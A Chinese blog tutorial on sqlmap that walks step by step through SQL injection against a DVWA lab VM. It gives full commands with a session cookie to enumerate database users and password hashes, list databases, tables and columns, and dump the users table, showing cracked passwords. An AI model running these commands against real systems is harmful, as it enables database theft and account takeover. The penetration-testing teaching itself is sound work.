---
title: SQL注入之SQLmap入门
date: 2017-09-27 14:34:41
categories:
tags:
---
###什么是SQLmap？

**SQLmap是一款用来检测与利用SQL注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。**
<!-- more -->
读者可以通过位于SourceForge的官方网站下载SQLmap源码：[http://sourceforge.net/projects/sqlmap/](http://sourceforge.net/projects/sqlmap/)

###SQLmap的作者是谁？
Bernardo DameleAssumpcao Guimaraes (@inquisb)，读者可以通过[bernardo@sqlmap.org](mailto:bernardo@sqlmap.org)与他取得联系，以及Miroslav Stampar (@stamparm)读者可以通过[miroslav@sqlmap.org](mailto:miroslav@sqlmap.org)与他联系。

同时读者也可以通过dev@sqlmap.org与SQLmap的[所有开发者](http://www.freebuf.com/sectool/77948.html)联系。

###执行SQLmap的命令是什么？
进入sqlmap.py所在的目录，执行以下命令：
```
#python sqlmap.py -h
```
（译注：选项列表太长了，而且与最新版本有些差异，所以这里不再列出，请读者下载最新版在自己机器上看吧）

SQLmap命令选项被归类为目标（Target）选项、请求（Request）选项、优化、注入、检测、技巧（Techniques）、指纹、枚举等。

###如何使用SQLmap：
为方便演示，我们创建两个虚拟机：
```
1、受害者机器， windows     XP操作系统，运行一个web服务器，同时跑着一个包含漏洞的web应用（DVWA）。

2、攻击器机器，使用Ubuntu     12.04，包含SQLmap程序。
```
本次实验的目的：使用SQLmap得到以下信息：
```
3、枚举MYSQL用户名与密码。

4、枚举所有数据库。

5、枚举指定数据库的数据表。

6、枚举指定数据表中的所有用户名与密码。
```
使用SQLmap之前我们得到需要当前会话cookies等信息，用来在渗透过程中维持连接状态，这里使用Firefox中名为“TamperData”的add-on获取。

![图片.png](http://upload-images.jianshu.io/upload_images/977602-e18fb96794c1671a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
当前得到的cookie为“**security=high;PHPSESSID=57p5g7f32b3ffv8l45qppudqn3**″。
为方便演示，我们将DVWA安全等级设置为low：
[![SQL入门](http://upload-images.jianshu.io/upload_images/977602-cd88f314864cdb6b.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)](http://image.3001.net/images/20140326/13958006297369.png)
接下来我们进入页面的“SQL Injection”部分，输入任意值并提交。可以看到get请求的ID参数如下：
```
“http://10.10.10.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#”
```
因此该页面就是我们的目标页面。

以下命令可以用来检索当前数据库和当前用户：
```
“./sqlmap.py -u“http://10.10.10.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit” –cookie=”PHPSESSID=57p5g7f32b3ffv8l45qppudqn3;security=low” -b –current-db –current-user”
```
###使用选项：
1、–cookie : 设置我们的cookie值“将DVWA安全等级从high设置为low”
2、-u : 指定目标URL
3、-b : 获取DBMS banner
4、–current-db : 获取当前数据库
5、–current-user:获取当前用户
结果如下：
[![SQL入门](http://upload-images.jianshu.io/upload_images/977602-c1802858ad60b172.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)](http://image.3001.net/images/20140326/13958006473538.png)
可以看到结果如下：
```
DBMS : MySQLversion 5.0
OS versionUbuntu 12.04
current user:root
current db :DVWA
```
以下命令用来枚举所有的DBMS用户和密码hash，在以后更进一步的攻击中可以对密码hash进行破解：
```
“sqlmap.py -u“http://10.10.10.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit” --cookie=”PHPSESSID=57p5g7f32b3ffv8l45qppudqn3;security=low” --string=”Surname” --users --password”
```
使用选项：
1、–string : 当查询可用时用来匹配页面中的字符串
2、–users : 枚举DBMS用户
3、–password : 枚举DBMS用户密码hash
[![SQL入门](http://upload-images.jianshu.io/upload_images/977602-b882a16abd540ca0.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)](http://image.3001.net/images/20140326/13958006501262.png)
结果如下：
```
databasemanagement system users [142]:
[*] ”@’kingasmk’
[*]”@’localhost’
[*]‘debian-sys-maint’@'localhost’
[*]‘phpmyadmin’@'localhost’
[*]‘root’@’127.0.0.1′
[*] ‘root’@'::1′
[*]‘root’@'kingasmk’
[*]‘root’@'localhost’
```
数据库管理系统用户和密码hash：
```
[*]debian-sys-maint [1]:
password hash:*C30441E06530498BC86019BF3211B94B3BAB295A
[*] phpmyadmin[1]:
password hash:*C30441E06530498BC86019BF3211B94B3BAB295A
[*] root [4]:
password hash: *C30441E06530498BC86019BF3211B94B3BAB295A
password hash:*C30441E06530498BC86019BF3211B94B3BAB295A
password hash:*C30441E06530498BC86019BF3211B94B3BAB295A
password hash:*C30441E06530498BC86019BF3211B94B3BAB295A
```
读者可以使用Cain&Abel、John&Ripper等工具将密码hash破解为明文。以下命令会枚举系统中所有的数据库schema：
```
“sqlmap.py -u“http://10.10.10.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit”
--cookie=”PHPSESSID=57p5g7f32b3ffv8l45qppudqn3;security=low” --dbs”
```
使用选项：
–dbs: 枚举DBMS中的数据库

[![SQL入门](http://upload-images.jianshu.io/upload_images/977602-269f1ef498a338aa.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)](http://image.3001.net/images/20140326/13958006531974.png)
结果如下：
```
availabledatabases [5]:
[*]dvwa
[*]information_schema
[*]mysql
[*]performance_schema
[*]phpmyadmin
```
下面我们尝试枚举DVWA数据表，执行以下命令：
```
“sqlmap.py-u “http://10.10.10.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit” --cookie=”PHPSESSID=57p5g7f32b3ffv8l45qppudqn3;security=low” -D dvwa --tables”
```
使用选项：
1、-D : 要枚举的DBMS数据库
2、–tables     : 枚举DBMS数据库中的数据表
[![SQL入门](http://upload-images.jianshu.io/upload_images/977602-a23c72c8461a5bc1.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)](http://image.3001.net/images/20140326/13958006567924.png)
得到结果如下：
```
Database: dvwa
[2 tables]
+————+
| guestbook |
| users |
+————+
```
下面获取用户表的列，命令如下：
```
 “sqlmap.py -u“http://10.10.10.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit” --cookie=”PHPSESSID=57p5g7f32b3ffv8l45qppudqn3;security=low” -D dvwa -T users --columns”
```
使用选项：
-T : 要枚举的DBMS数据库表

–columns : 枚举DBMS数据库表中的所有列

[![SQL入门](http://upload-images.jianshu.io/upload_images/977602-32256a0dbe738288.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)](http://image.3001.net/images/20140326/139580065727.png)
结果如下：
```
Database: dvwa
Table: users
[6 columns]
+————+————-+
| Column | Type|
+————+————-+
| avatar |varchar(70) |
| first_name |varchar(15) |
| last_name |varchar(15) |
| password |varchar(32) |
| user |varchar(15) |
| user_id |int(6) |
+————+————-+
```
如上所示，以上为我们感兴趣的列，表示用户名与密码等。下面将每一列的内容提取出来。执行以下命令，将用户与密码表中的所有用户名与密码dump出来：
```
“sqlmap.py -u“http://10.10.10.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit”–cookie=”PHPSESSID=57p5g7f32b3ffv8l45qppudqn3; security=low” -D dvwa -T users-C user,password --dump”
```
**使用选项：**
-T : 要枚举的DBMS数据表

-C: 要枚举的DBMS数据表中的列

–dump : 转储DBMS数据表项

SQLmap会提问是否破解密码，按回车确认：
[![SQL入门](http://upload-images.jianshu.io/upload_images/977602-3de5d38d6beae65b.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)](http://image.3001.net/images/20140326/13958006608637.png)
得到所有用户名与明文密码如下：
```
Database: dvwa
Table: users
[5 entries]
+———+———+———————————————+
| user_id | user| password |
+———+———+———————————————+
| 1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99(password) |
| 2 | gordonb |e99a18c428cb38d5f260853678922e03 (abc123) |
| 3 | 1337 |8d3533d75ae2c3966d7e0d4fcc69216b (charley) |
| 4 | pablo |0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) |
| 5 | smithy |5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+———+———+———————————————+
```

这时我们就可以利用admin帐户登录做任何事了。

总结：
SQLmap是一个非常强大的工具，可以用来简化操作，并自动处理SQL注入检测与利用。

原文地址：http://www.freebuf.com/articles/web/29942.html


